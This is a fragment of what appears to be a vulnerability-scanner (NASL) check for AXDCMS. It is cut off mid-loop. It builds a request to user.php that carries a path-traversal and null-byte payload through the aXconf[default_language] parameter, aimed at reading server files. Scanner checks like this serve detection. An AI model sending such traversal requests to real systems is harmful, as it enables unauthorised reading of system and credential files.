...
for dir in nasl_make_list_unique( "/axdcms", "/cms", http_cgi_dirs( port: port ) ) {
	if(dir == "/"){
		dir = "";
	}
	for file in keys( files ) {
		url = NASLString( dir, "/modules/profile/user.php?aXconf[default_language]=", crap( data: "../", length: 3 * 18 ), files[file], "%00" );
